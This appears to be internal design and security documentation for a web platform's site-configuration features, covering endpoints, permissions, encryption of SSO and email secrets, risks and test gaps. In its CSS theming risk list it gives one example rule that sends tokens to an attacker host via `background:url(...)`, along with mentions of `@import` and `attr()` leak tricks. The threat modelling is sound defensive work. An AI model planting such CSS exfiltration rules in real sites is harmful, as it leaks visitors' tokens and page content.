# Cluster: Site Configuration & Theming

The configuration layer that drives the instance's branding, feature toggles, and behavior — what admins configure and what every visitor and API caller observes.

**Implementation:** `backend/src/routes/v2/system/site-management.route.js`, `backend/src/services/siteConfig.service.js`, `backend/src/models/siteConfig.model.js`, `backend/src/config/predefinedSiteConfigs.js`, `frontend/src/pages/SiteConfigManagement.tsx`.

```mermaid
flowchart TD
    subgraph Storage
        SC[("site_configs collection")]
        SNAP[("SiteConfigSnapshot")]
    end
    subgraph Predefined
        PDC["predefinedSiteConfigs.js<br/>(seeded $setOnInsert)"]
        PDA["predefinedAuthConfigs.js"]
    end
    PDC -.->|seed on startup| SC
    PDA -.->|auth defaults| SC
    SC -->|public reads| PUB["Public config<br/>(non-secret)"]
    SC -->|admin reads/writes| ADM["Admin sections<br/>(SiteConfigManagement.tsx)"]
    SC --> CSS["/static/global.css<br/>(themed UI)"]
    SC -->|flags| AUTH["req.authConfig<br/>(PUBLIC_VIEWING · SELF_REGISTRATION · SSO · PWD)"]
    SC --> SSO["SSO providers / Email"]
    SC --> HOME["CFG_HOME_CONTENT blocks"]
    SC --> PRIV["PRIVACY_POLICY_CONTENT"]
    ADM -->|snapshot| SNAP
    SNAP -->|restore| SC
```

---

## Capabilities in this cluster

| ID | Capability |
|----|------------|
| [CAP-CONFIG-01](#cap-config-01--site-config-crud) | Site config CRUD |
| [CAP-CONFIG-02](#cap-config-02--site-config-management-admin) | Site Config management (admin) |
| [CAP-CONFIG-03](#cap-config-03--global-css-theming) | Global CSS theming |
| [CAP-CONFIG-04](#cap-config-04--home-config-editor) | Home config editor |
| [CAP-CONFIG-05](#cap-config-05--branding) | Branding |
| [CAP-CONFIG-06](#cap-config-06--auth-config-flags) | Auth config flags |
| [CAP-CONFIG-07](#cap-config-07--sso--email-configuration) | SSO & Email configuration |
| [CAP-CONFIG-08](#cap-config-08--site-config-snapshots--restore) | Site config snapshots & restore |
| [CAP-CONFIG-09](#cap-config-09--privacy-policy) | Privacy policy |


## CAP-CONFIG-01 — Site config CRUD

### Description

As an admin, I can create, read, update, and delete scoped site-config keys (`site`/`user`/`model`/`prototype`/`api`) with typed values (string/boolean/number/array/object/image_url/color/date) and a `secret` flag so that every behavior, branding, and feature toggle of the instance is configurable in one place. Anyone can read non-secret config; only admins can change it; predefined configs are seeded on startup and never overwrite admin-set values.

### Who uses it / value

Admins (configure the platform); end users (consume public config); the app (feature toggles/branding).

### Acceptance criteria

- When I (admin) call `GET/POST /v2/site-config`, `GET /v2/site-config/all`, `POST /v2/site-config/by-keys`, `POST /v2/site-config/bulk-upsert`, `GET/PATCH/DELETE /v2/site-config/:id`, `/key/:key`, or `/:scope/:target_id[/all]`, the system returns `200`/`201`/`204` as appropriate.
- When I (anyone) call `GET /v2/site-config/public[/:key|/:scope/:target_id[/:key]]`, the system returns only non-secret configs; when I call `GET /v2/site-config/sso/providers`, the system returns enabled providers without secrets.
- When I mark a config with the `secret` flag, the system encrypts it at rest and never exposes it via public reads.
- When the instance starts, the system seeds predefined configs but never overwrites values I have already set.

### Quality control

As an admin, set a key then re-read it (and the public read) to confirm the value persists and that `secret`-flagged values stay hidden from public reads; upsert by key and bulk-upsert to verify multi-key writes; restart the instance and confirm seeding does not overwrite admin-set values.

```mermaid
flowchart LR
    A([Admin]) -->|"GET/POST /v2/site-config"| CRUD["site_configs (key,scope,target_id)"]
    CRUD -->|secret=true| HIDE["hidden from public"]
    CRUD -->|secret=false| PUB["GET /v2/site-config/public"]
    SEED["predefinedSiteConfigs $setOnInsert"] -.->|never overwrites| CRUD
```

### Security

Public routes public; everything else requires `MANAGE_USERS`. `secret` configs are never exposed publicly.

**Coverage:**
- **Auth:** Anyone can read public config anonymously (`GET /v2/site-config/public*`, `GET /v2/site-config/sso/providers`); all other site-config routes require authentication and `MANAGE_USERS`.
- **Authorization:** `MANAGE_USERS` required for every admin CRUD, scope, by-keys, bulk-upsert, restore-snapshot, global-css, and email-test route; public reads have no permission check.
- **Input validation:** Caller must send a valid scope enum (`site`/`user`/`model`/`prototype`/`api`), conditional `target_id`, a `valueType` enum, and a `secret` boolean; the `value` field itself accepts any shape (no server-side schema check).
- **Rate limiting:** not applied.
- **Secrets:** The `secret` flag excludes values from public reads; `SSO_PROVIDERS.clientSecret` and `EMAIL_CONFIG.apiKey`/`smtpConfig.pass` are encrypted at rest (AES-256-CBC) and decrypted only for admin display.

**Risks:**
- **Config takeover:** a missing `MANAGE_USERS` check on admin endpoints would let any user flip security-critical flags (e.g. disable `PUBLIC_VIEWING` gating or enable `SELF_REGISTRATION`) and take over the instance's auth posture.
- **Secret leakage:** if the `secret` flag were honored only client-side or stripped from a single endpoint, secrets such as SSO `clientSecret` or email API keys could leak via a public read path.
- **Scope/target_id spoofing:** write endpoints keyed on `(key, scope, target_id)` could let an attacker write into another tenant's/model's scope if scope authorization is not enforced server-side.

### Data protection

`secret` flag hides values from public reads; SSO provider secrets + email API keys **encrypted at rest**, decrypted only for admin display.

**Coverage:**
- **Stored data:** `site_configs` collection (fields: `key`, `scope`, `target_id`, `value` (Mixed), `valueType`, `secret`, `description`, `category`, `created_by`, `updated_by`); `SiteConfigSnapshot` mirrors site-scope configs for restore; unique index on `(key, scope, target_id)`.
- **PII:** no — config values only; `created_by`/`updated_by` hold admin user ObjectIds (refs, not PII).
- **Retention:** indefinite — no TTL; deletes are hard deletes.
- **Encryption:** AES-256-CBC at rest for secret-flagged `SSO_PROVIDERS.clientSecret` and `EMAIL_CONFIG.apiKey`/`smtpConfig.pass`; non-secret values stored plaintext.
- **Logging:** none / N/A — no config values logged on the success path.

**Risks:**
- **Plaintext-at-rest fallback:** if encryption were bypassed or a new secret type were added without wiring it through `utils/encryption.js`, secrets would sit in plaintext and a DB dump would expose live credentials.
- **Admin-display interception:** secrets are decrypted for admin display, so a compromised admin session or logged response body leaks usable SSO/email credentials directly.

### Test coverage
- **E2E (Playwright):** 2 test case(s) in `site-config-restore-default.spec.ts` — SITEMAP: ⚠️ (public config write+read asserted as scaffolding for restore-default; admin CRUD endpoint matrix, by-keys, bulk-upsert, scoped reads, and secret handling not exercised)
- **Unit (Jest):** none

## CAP-CONFIG-02 — Site Config management (admin)

### Description

As an admin, I can manage the instance's configuration from a single admin page organized into 11 sections (Public, Home, Site Style, Auth, Model & Prototype, GenAI/ProtoPilot, SSO, Email, Secret, Standard Staging, Privacy), each with edit history I can restore, so all site configuration is centralized in one place.

### Who uses it / value

Admins (central configuration).

### Acceptance criteria

- When I open `/admin/site-config` (requires `MANAGE_USERS`), the system shows the 11 sections; when I edit keys in a section, the system persists them; when I restore from edit history, the system reverts that section to the snapshot.

### Quality control

As an admin, edit a config in a section, then verify the value persists and applies site-wide; restore from history and verify the section reverts.

```mermaid
flowchart TD
    A([Admin]) -->|"/admin/site-config (MANAGE_USERS)"| SEC["11 sections"]
    SEC --> EDIT["Edit keys"]
    EDIT --> HIST["Edit history snapshot"]
    HIST -->|restore| EDIT
    EDIT -->|persist| SC[("site_configs")]
```

### Security

`MANAGE_USERS` for all sections.

**Coverage:**
- **Auth:** required for all admin site-config routes used by the 11 sections.
- **Authorization:** `MANAGE_USERS` — single shared gate for all sections (Public, Home, Site Style, Auth, Model & Prototype, GenAI/ProtoPilot, SSO, Email, Secret, Standard Staging, Privacy).
- **Input validation:** write endpoints are schema-validated, but `value` accepts any shape (section-specific shapes like home blocks / SSO providers / email config are not validated server-side); global-css `PUT` requires `content` to be a string and `/email/test` requires `to` to be present (controller-level checks only).
- **Rate limiting:** not applied.
- **Secrets:** secret sections mask values in the UI; SSO `clientSecret` and EMAIL `apiKey`/`smtpConfig.pass` are encrypted at rest and decrypted only for admin display within the Secret/SSO/Email sections.

**Risks:**
- **Single-gate blast radius:** every section sits behind the same `MANAGE_USERS` permission, so one compromised admin (or one overly-broad grant) can rewrite auth, SSO, email, and feature flags simultaneously.
- **History restore abuse:** if restore-from-history lacked re-authorization, an attacker who once held `MANAGE_USERS` could replay an old config (e.g. re-enabling disabled SSO) after their access was revoked.

### Data protection

Edit history (snapshots) retained; secret sections mask values.

**Coverage:**
- **Stored data:** `site_configs` (live config) + `SiteConfigSnapshot` (edit history / deploy snapshot) — site-scope configs including encrypted secret values in SSO/Email/Secret sections; admin user ids in `created_by`/`updated_by`.
- **PII:** no — administrative configuration only; `created_by`/`updated_by` are admin user refs.
- **Retention:** indefinite — snapshots retained until overwritten by a new deploy-seed sync or manual restore; no TTL on live configs.
- **Encryption:** secrets stored encrypted (AES-256-CBC) in both live config and snapshots; non-secret config plaintext.
- **Logging:** none / N/A — no section edits or secret values logged.

**Risks:**
- **Snapshot retention of secrets:** edit history snapshots may retain prior secret values; if those snapshots aren't masked/encrypted like the live config, old credentials remain recoverable.
- **Change history leak:** config edit history can reveal administrative actions, SSO provider changes, and email setup patterns to anyone with admin access.

### Test coverage
- **E2E (Playwright):** 8 test case(s) in `admin.spec.ts` (1 — site-config page loads) + `nav-bar-actions.spec.ts` (7 — navbar-actions section editor within site-config) — SITEMAP: ⚠️ (page load + nav section covered; 10 of 11 sections incl. Auth/SSO/Email/Secret/Privacy untested)
- **Unit (Jest):** none

## CAP-CONFIG-03 — Global CSS theming

### Description

As an admin, I can set and restore the platform's global stylesheet so the entire instance is themed consistently; as an end user or plugin author, I get a stable themed UI and CSS variables to consume.

### Who uses it / value

Admins (brand the site); end users (themed UI); plugins (consume CSS variables).

### Acceptance criteria

- When I (anyone) load `/static/global.css`, the system serves the stylesheet publicly with no auth.
- When I (admin) call `GET /v2/site-config/global-css` (auth + `MANAGE_USERS`), the system returns `200` with the current stylesheet; when I call `PUT /v2/site-config/global-css` (auth + `MANAGE_USERS`), the system returns `200` and applies the new CSS; when I call `POST /v2/site-config/global-css/restore-default` (auth + `MANAGE_USERS`), the system restores the shipped default.

### Quality control

As an admin, edit `:root` tokens (e.g. `--primary`) and observe the UI re-theme live; call `POST /v2/site-config/global-css/restore-default` and confirm the shipped styling returns.

```mermaid
sequenceDiagram
    participant A as Admin
    participant E as /v2/site-config/global-css
    participant S as /static/global.css
    participant U as End user
    A->>E: PUT (MANAGE_USERS)
    E-->>A: 200
    U->>S: GET (public)
    S-->>U: themed CSS
    A->>E: POST /restore-default
    E-->>A: shipped default restored
```

### Security

All three `/v2/site-config/global-css` endpoints require auth + `MANAGE_USERS`; the stylesheet itself is public at `/static/global.css`. CSS can contain selectors only (no script); instance overrides use `!important` guidance.

**Coverage:**
- **Auth:** required for `GET /global-css`, `PUT /global-css`, and `POST /global-css/restore-default`; the stylesheet at `/static/global.css` is served publicly (anonymous).
- **Authorization:** `MANAGE_USERS` on all three admin endpoints.
- **Input validation:** `content` must be a string (the system returns `400` otherwise); no sanitization or allowlist of CSS rules (`@import`, `url()`, `attr()` permitted).
- **Rate limiting:** not applied.
- **Secrets:** none — stylesheet text only; no credentials involved.

**Risks:**
- **CSS-based exfiltration:** even without `<script>`, an attacker who can write the stylesheet can craft `background:url(attacker.com?token=...)`-style rules to exfiltrate page content and tokens, or use `@import` to pull remote stylesheets.
- **Unauthenticated styling takeover:** if `PUT` lacked the `MANAGE_USERS` check, anyone could restyle the site (defacement) or mount phishing-by-styling (hiding warnings, recoloring buttons to lure clicks).
- **DOM-based attacks via selectors:** hostile selectors combined with `attr()`/content tricks can extract attributes from rendered DOM and leak them via image requests.

### Data protection

Stylesheet text only; no PII.

**Coverage:**
- **Stored data:** `static/global.css` file on disk (not in `site_configs`); `static/global_org.css` holds the shipped default copied over on restore.
- **PII:** no — stylesheet text only.
- **Retention:** indefinite — file persists on disk until overwritten by `PUT` or `restore-default`; no versioning.
- **Encryption:** none — plaintext CSS file on the backend filesystem.
- **Logging:** none / N/A — no logging of CSS content.

**Risks:**
- **Indirect PII leak:** if CSS can target elements that render user data (e.g. names in attribute values), attribute-value exfiltration could disclose PII to an attacker-controlled endpoint.

### Test coverage
- **E2E (Playwright):** 0 — not covered — SITEMAP: ❌ (no spec exercises `GET/PUT /global-css`, `/global-css/restore-default`, or `/static/global.css` theming)
- **Unit (Jest):** none

## CAP-CONFIG-04 — Home config editor

### Description

As an admin, I can compose the landing page from drag-and-drop blocks (hero, feature-list, button-list, news, recent, popular, partner-list, home-footer) with raw JSON, preview, and history, so the home page presents the content my organization wants visitors to see first.

### Who uses it / value

Admins (compose the landing page).

### Acceptance criteria

- When I (admin) edit `CFG_HOME_CONTENT`, the system persists the block list; when a visitor opens the home page, the system renders the blocks and skips any unknown block types.

### Quality control

As an admin, add and reorder blocks, then open the home page to confirm the layout reflects the changes; use preview to check the layout and raw JSON to edit directly.

```mermaid
flowchart LR
    A([Admin]) -->|"edit CFG_HOME_CONTENT"| BLOCKS["hero · feature-list · button-list · news · recent · popular · partner-list · home-footer"]
    BLOCKS -->|raw JSON / preview / history| HIST["History snapshot"]
    BLOCKS -->|render via homeComponentMap| PH(["PageHome (landing)"])
```

### Security

Admin only.

**Coverage:**
- **Auth:** required to edit `CFG_HOME_CONTENT`; public reads of the non-secret config are anonymous.
- **Authorization:** `MANAGE_USERS` for edits; public read has no permission check.
- **Input validation:** the block array shape is not validated server-side (`value` accepts any shape); `image_url` fields are not URL-validated.
- **Rate limiting:** not applied.
- **Secrets:** none — `CFG_HOME_CONTENT` is non-secret public content.

**Risks:**
- **Stored XSS via block content:** if block titles/descriptions/image URLs are rendered without sanitization, an admin (or a compromised admin account) could inject markup/scripts into every visitor's landing page.
- **Malicious image URL redirect:** `image_url` fields, if not validated, could point to attacker-controlled hosts used for tracking or to serve malicious payloads.

### Data protection

Block content (titles/descriptions/image URLs); `requiredLogin` flags on action buttons.

**Coverage:**
- **Stored data:** `CFG_HOME_CONTENT` value (array of block objects: hero, feature-list, button-list, news, recent, popular, partner-list, home-footer) in `site_configs` (scope `site`, non-secret); edit-history snapshots in `SiteConfigSnapshot`.
- **PII:** no — marketing/landing content; admin-entered free text could in principle include names but no user PII is system-stored here.
- **Retention:** indefinite — config value persists until edited/restored; snapshots per sync cycle.
- **Encryption:** none — plaintext public config value.
- **Logging:** none / N/A — no logging of block content.

**Risks:**
- **Login-flow confusion:** a `requiredLogin` flag on action buttons drives auth gating; if misconfigured or tampered with, buttons could route users to attacker-controlled auth flows (credential phishing) from the public landing page.

### Test coverage
- **E2E (Playwright):** 0 — not covered — SITEMAP: ❌ (`home-sections.spec.ts` renders home blocks but does not exercise the `CFG_HOME_CONTENT` admin editor, raw JSON, preview, or history)
- **Unit (Jest):** none

## CAP-CONFIG-05 — Branding

### Description

As an admin, I can set the platform's `SITE_TITLE`, `SITE_LOGO_WIDE`, `SITE_FAVICON`, `SITE_THEME_COLOR`, and `SITE_DESCRIPTION` so the instance carries my organization's brand identity consistently across the UI and browser tab.

### Who uses it / value

Admins (brand identity); end users (consistent branding).

### Acceptance criteria

- When I (admin) set `SITE_TITLE`, `SITE_LOGO_WIDE`, `SITE_FAVICON`, `SITE_THEME_COLOR`, or `SITE_DESCRIPTION`, the system reflects them in the nav bar, root layout, browser tab, and dashboard logo; when anyone reads public config, the system returns these non-secret branding keys.

### Quality control

As an admin, set `SITE_TITLE` and confirm the nav title and browser title update; set `SITE_LOGO_WIDE` and confirm it renders.

### Security

Public read; admin write.

**Coverage:**
- **Auth:** public read is anonymous (`GET /v2/site-config/public*` returns non-secret branding keys); admin write requires authentication and `MANAGE_USERS`.
- **Authorization:** `MANAGE_USERS` for writes; public reads have no permission check.
- **Input validation:** branding values accept any shape; `SITE_LOGO_WIDE`/`SITE_FAVICON` URLs are stored as-is and not enforced as image URLs server-side.
- **Rate limiting:** not applied.
- **Secrets:** none — branding values are public.

**Risks:**
- **Brand spoofing via logo URL:** `SITE_LOGO_WIDE`/`SITE_FAVICON` are URLs; if an admin (or anyone with write access) sets them to an external host, the site loads third-party assets, enabling tracking or phishing via a swapped logo.
- **Phishing via title/description:** a malicious `SITE_TITLE`/`SITE_DESCRIPTION` could impersonate another brand on the public site and browser tab, aiding credential phishing.

### Data protection

Branding asset URLs only.

**Coverage:**
- **Stored data:** `SITE_TITLE`, `SITE_LOGO_WIDE`, `SITE_FAVICON`, `SITE_THEME_COLOR`, `SITE_DESCRIPTION` values in `site_configs` (scope `site`, `secret: false`).
- **PII:** no — branding text/asset URLs.
- **Retention:** indefinite — public config values persist until edited/restored.
- **Encryption:** none — plaintext public config.
- **Logging:** none / N/A — branding values exposed via public read by design.

**Risks:**
- **Asset-URL leakage:** branding URLs can reveal internal hosting paths or third-party providers in the public config response.

### Test coverage
- **E2E (Playwright):** 7 test case(s) in `nav-bar-actions.spec.ts` — SITEMAP: ⚠️ (NAV_BAR_ACTIONS editor + navbar rendering covered; `SITE_TITLE`/`SITE_LOGO_WIDE`/`SITE_FAVICON`/`SITE_THEME_COLOR`/`SITE_DESCRIPTION` not directly tested)
- **Unit (Jest):** none

## CAP-CONFIG-06 — Auth config flags

### Description

As an admin, I can toggle the platform's access flags `PUBLIC_VIEWING`, `SELF_REGISTRATION`, `SSO_AUTO_REGISTRATION`, and `PASSWORD_MANAGEMENT` (all default `true`) so I control who can browse, sign up, auto-register via SSO, and manage passwords; if config loading fails on a request, the system secure-fails to all-false.

### Who uses it / value

Admins (control access/registration); the app (gating).

### Acceptance criteria

- When I (admin) toggle `PUBLIC_VIEWING`, `SELF_REGISTRATION`, `SSO_AUTO_REGISTRATION`, or `PASSWORD_MANAGEMENT`, the system applies the change to auth behavior across the app (see [identity-access.md](./identity-access.md)); when I restore defaults, the system restores the shipped `true` defaults; when config loading fails on a request, the system secure-fails to all-false.

### Quality control

As an admin, toggle `PUBLIC_VIEWING` off and confirm signed-out users cannot browse; toggle `SELF_REGISTRATION` off and confirm registration returns `403`.

```mermaid
flowchart TD
    REQ["Incoming request"] --> LOAD["load authConfig flags<br/>PUBLIC_VIEWING · SELF_REGISTRATION · SSO_AUTO_REGISTRATION · PASSWORD_MANAGEMENT"]
    LOAD -->|error| FAIL["secure-fail → all false"]
    LOAD -->|ok| REQ2["req.authConfig"]
    REQ2 --> GATE["gate routes<br/>(403 / 401 on off)"]
    ADM([Admin]) -.->|change| CFG[("site_configs")]
    CFG -.-> LOAD
```

### Security

Public (effective flags observable); admin to change; safe-default all-false on error.

**Coverage:**
- **Auth:** effective flags are publicly observable via `GET /v2/site-config/public*`; changing them requires authentication and `MANAGE_USERS`; the flags are loaded on every request.
- **Authorization:** `MANAGE_USERS` to change flag values; public reads have no permission check.
- **Input validation:** flags are `valueType: 'boolean'`, `secret: false`; the system coerces values to boolean.
- **Rate limiting:** not applied.
- **Secrets:** none — boolean flags only.

**Risks:**
- **Flag tampering to bypass auth:** if the admin write check on these flags were weak, an attacker could flip `PUBLIC_VIEWING=true` or `SELF_REGISTRATION=true` to weaken access controls or open anonymous registration.
- **Fail-open on load error:** the design secure-fails to all-false; if that fallback regressed to fail-open, a config-load error would silently expose the site to anonymous users.
- **Observability leak:** effective flags are publicly observable, which can help attackers probe which auth paths are enabled (e.g. whether self-registration is open).

### Data protection

Boolean flags only.

**Coverage:**
- **Stored data:** `PUBLIC_VIEWING`, `SELF_REGISTRATION`, `SSO_AUTO_REGISTRATION`, `PASSWORD_MANAGEMENT` boolean values in `site_configs` (scope `site`, `secret: false`, `category: 'auth'`); cached in memory for up to 5 min and loaded per request.
- **PII:** no — boolean flags only.
- **Retention:** indefinite — config flags persist until changed/restored; cache evicted after 5 min.
- **Encryption:** none — plaintext booleans (non-secret by design).
- **Logging:** none / N/A — no flag values logged on the success path.

**Risks:**
- **Inference of attack surface:** while flags are booleans only, exposing which gates are enabled tells an attacker exactly which registration/SSO avenues to target.

### Test coverage
- **E2E (Playwright):** 0 — not covered — SITEMAP: ❌ (`admin-features.spec.ts` tests feature role assignment, not auth config flag toggling; no spec exercises `PUBLIC_VIEWING`/`SELF_REGISTRATION`/`SSO_AUTO_REGISTRATION`/`PASSWORD_MANAGEMENT` gating)
- **Unit (Jest):** none

## CAP-CONFIG-07 — SSO & Email configuration

### Description

As an admin/DevOps, I can configure SSO providers (with encrypted `clientSecret`) and email delivery (Resend/SMTP/none) and send a test email, so users can sign in via SSO and the platform can send mail; as an end user, I see only the enabled SSO providers (no secrets).

### Who uses it / value

Admins/DevOps (configure SSO + email); end users (SSO buttons).

### Acceptance criteria

- When I (anyone) call `GET /v2/site-config/sso/providers`, the system returns enabled providers without `clientSecret`; when I (admin) CRUD providers, the system decrypts `clientSecret` for display; when I (admin) call `POST /v2/site-config/email/test`, the system sends a test email.

### Quality control

As an admin, add an SSO provider and confirm the sign-in button appears; configure email (Resend/SMTP) and confirm a test send succeeds; remove the provider and confirm the button is hidden.

```mermaid
sequenceDiagram
    participant A as Admin
    participant E as /v2/site-config/sso/providers
    participant DB as site_configs (encrypted)
    participant U as End user
    A->>E: POST provider (clientSecret)
    E->>DB: encrypt at rest
    U->>E: GET (public)
    E-->>U: enabled providers (no secrets)
    A->>E2: POST /v2/site-config/email/test
    E2->>E2: send test email
    E2-->>A: result
```

### Security

Secrets encrypted at rest; never in public reads; admin-only writes.

**Coverage:**
- **Auth:** required (admin) for SSO/Email CRUD and `POST /v2/site-config/email/test`; `GET /v2/site-config/sso/providers` is public (anonymous) and strips `clientSecret`.
- **Authorization:** `MANAGE_USERS` for admin writes/test-send; the public providers endpoint returns enabled providers only (no `clientSecret`).
- **Input validation:** provider objects and the `EMAIL_CONFIG` shape are not schema-validated server-side (`value` accepts any shape); `POST /email/test` requires `to` to be present.
- **Rate limiting:** not applied (test-send is unthrottled).
- **Secrets:** `SSO_PROVIDERS[].clientSecret` and `EMAIL_CONFIG.apiKey`/`smtpConfig.pass` are encrypted at rest (AES-256-CBC) and decrypted only for admin display in the SSO/Email sections; `clientSecret` is removed before any public response.

**Risks:**
- **SSO secret theft:** a compromised admin session decrypts `clientSecret` for display; a stolen secret lets an attacker impersonate the SP and intercept SSO logins.
- **Email API key abuse:** a leaked `EMAIL_CONFIG` apiKey/smtp credentials let an attacker send mail as the platform (phishing from a trusted domain) or exhaust the mail quota.
- **Provider-list spoofing:** if the public providers endpoint returned config beyond the enabled flag, it could leak redirect URLs / client IDs useful for phishing.

### Data protection

Secrets (`clientSecret`/`apiKey`/`smtpConfig.pass`) encrypted; email logs may include recipient addresses.

**Coverage:**
- **Stored data:** `SSO_PROVIDERS` (array of provider objects incl. encrypted `clientSecret`) and `EMAIL_CONFIG` (object incl. encrypted `apiKey`/`smtpConfig.pass`) in `site_configs` (scope `site`, `secret: true`).
- **PII:** no provider PII — but `POST /email/test` takes a `to` recipient email address (admin-supplied) returned in the response message `Test email sent to <to>`.
- **Retention:** indefinite — encrypted secrets persist until an admin rotates them; no TTL/expiry.
- **Encryption:** AES-256-CBC at rest for `clientSecret`, `apiKey`, `smtpConfig.pass`; already-encrypted values are not re-encrypted.
- **Logging:** the test-send response includes the recipient address; no secrets logged on the success path.

**Risks:**
- **Recipient disclosure in logs:** test-send logs may include recipient addresses, surfacing the admin's email (and any test recipients) in audit/log stores.
- **Persistent credential reuse:** encrypted secrets persist until rotated; a past compromise leaves stolen credentials valid until an admin manually rotates them.

### Test coverage
- **E2E (Playwright):** 0 — not covered — SITEMAP: ❌ (no spec exercises SSO provider CRUD, `/sso/providers` public list, `EMAIL_CONFIG` setup, or `/email/test`)
- **Unit (Jest):** none

## CAP-CONFIG-08 — Site config snapshots & restore

### Description

As an admin/DevOps, I can restore the site config from a deploy snapshot merged with predefined defaults (snapshot wins per key), filtered by keys/categories/secret, and see per-key source (`snapshot`/`predefined`/`mixed`/`none`), so I can recover the instance's configuration after a bad change or migration.

### Who uses it / value

Admins/DevOps (recover config after a bad change or migration).

### Acceptance criteria

- When I (admin) call `POST /v2/site-config/restore-snapshot`, the system returns `200` with the restored config and per-key source; the snapshot is auto-synced when the deploy seeder runs.

### Quality control

As an admin, change a config, then call `POST /v2/site-config/restore-snapshot` and confirm it reverts to the snapshot where present, otherwise to the predefined default.

```mermaid
flowchart LR
    DEPLOY["Deploy seeder runs"] -.->|auto-sync| SNAP[("SiteConfigSnapshot")]
    SNAP --> MERGE["restore-snapshot (admin)"]
    PDEF["predefined defaults"] --> MERGE
    MERGE -->|snapshot wins per key| RES["restored config<br/>source: snapshot|predefined|mixed|none"]
    RES --> SC[("site_configs")]
```

### Security

Admin only.

**Coverage:**
- **Auth:** required — `POST /v2/site-config/restore-snapshot` is admin-only.
- **Authorization:** `MANAGE_USERS` — only admins may trigger restore; no re-authorization of prior-snapshot provenance.
- **Input validation:** caller may send `keys?: string[]`, `categories?: string[]`, `secret?: boolean`; at least one filter is required (the system returns `400` on an empty filter).
- **Rate limiting:** not applied.
- **Secrets:** the snapshot preserves `secret`-flagged configs in their encrypted form; restore re-upserts encrypted values (no decryption during restore); decrypted only on a subsequent admin read.

**Risks:**
- **Snapshot replay of weak config:** an attacker who reaches `restore-snapshot` could replay an older, less-secure snapshot (e.g. before SSO was hardened), reverting the instance to a vulnerable posture.
- **Predefined-default downgrade:** if a key is missing from the snapshot, predefined defaults are applied; if predefined defaults ever contained a weak value historically, restore could re-introduce it.

### Data protection

Snapshots hold site-scope configs incl. encrypted secrets.

**Coverage:**
- **Stored data:** `SiteConfigSnapshot` collection — mirrors site-scope `site_configs` (`key`, `scope`, `value`, `valueType`, `secret`, `description`, `category`); auto-synced when the deploy seeder runs; a `SiteConfigSnapshotMeta` record tracks the last-synced seed run.
- **PII:** no — config values + admin user refs only.
- **Retention:** only the latest snapshot is retained — sync replaces prior snapshots before reinserting; no TTL.
- **Encryption:** secrets stored encrypted in snapshots (same AES-256-CBC as live config; not re-encrypted during sync/restore).
- **Logging:** sync logs a count and timestamp only — no config values.

**Risks:**
- **Snapshot of secrets at rest:** snapshots include encrypted secrets; if encryption keys are rotated but old snapshots aren't re-encrypted, they become unreadable or, worse, decryptable with a leaked old key.
- **Recovery-time secret exposure:** during restore, decrypted secrets may flow into admin-visible output/logs, widening the window for capture.

### Test coverage
- **E2E (Playwright):** 2 test case(s) in `site-config-restore-default.spec.ts` — SITEMAP: ✅ (`Restore default` button in Public section calls `restoreConfigsFromSnapshot` → `POST /site-config/restore-snapshot`; revert + cancel flows covered)
- **Unit (Jest):** none

## CAP-CONFIG-09 — Privacy policy

### Description

As an admin, I can author the public Privacy Policy as markdown (or point to an external `PRIVACY_POLICY_URL`) with edit/preview and history, so end users see the legal terms that apply to the instance.

### Who uses it / value

End users (legal info); admins (maintain policy).

### Acceptance criteria

- When anyone opens `/privacy-policy`, the system renders the `PRIVACY_POLICY_CONTENT` markdown publicly; when I (admin) edit and preview the policy, the system saves and previews it; when I set `PRIVACY_POLICY_URL`, the system can redirect there instead.

### Quality control

As an admin, edit the policy and confirm the public page updates; set `PRIVACY_POLICY_URL` and confirm it redirects.

```mermaid
flowchart LR
    A([Admin]) -->|"PrivacyPolicySection"| CFG["PRIVACY_POLICY_CONTENT (markdown)"]
    CFG -->|render public| P(["/privacy-policy"])
    URL["PRIVACY_POLICY_URL"] -.->|redirect| P
```

### Security

Page public; editor admin.

**Coverage:**
- **Auth:** the `/privacy-policy` page renders anonymously; editing `PRIVACY_POLICY_CONTENT`/`PRIVACY_POLICY_URL` requires authentication and `MANAGE_USERS`.
- **Authorization:** `MANAGE_USERS` for editing; public page read has no permission check.
- **Input validation:** the markdown is not sanitized server-side (`value` accepts any shape); `PRIVACY_POLICY_URL` is not URL-validated server-side.
- **Rate limiting:** not applied.
- **Secrets:** none — policy markdown/URL are non-secret public content.

**Risks:**
- **Markdown XSS:** if `PRIVACY_POLICY_CONTENT` markdown is rendered without sanitization, an admin (or compromised admin) could inject scripts into a page visited by every user for legal/trust reasons.
- **Redirect abuse via `PRIVACY_POLICY_URL`:** if `PRIVACY_POLICY_URL` can be set to an external URL, an attacker with admin access could redirect the privacy policy to a phishing page, undermining legal trust.

### Data protection

Policy markdown only.

**Coverage:**
- **Stored data:** `PRIVACY_POLICY_CONTENT` (markdown string) and `PRIVACY_POLICY_URL` (string) in `site_configs` (scope `site`, `secret: false`); edit-history snapshots in `SiteConfigSnapshot`.
- **PII:** no — legal text only; no user data stored.
- **Retention:** indefinite — public config values persist until edited/restored.
- **Encryption:** none — plaintext public config (non-secret).
- **Logging:** none / N/A — no logging of policy content.

**Risks:**
- **Legal-text tampering:** unauthorized edits to the published policy could change stated data-handling commitments, creating legal exposure and misleading users about what their data is used for.

### Test coverage
- **E2E (Playwright):** 0 — not covered — SITEMAP: ❌ (no spec exercises the `/privacy-policy` page render, `PrivacyPolicySection` editor, preview, or history)
- **Unit (Jest):** none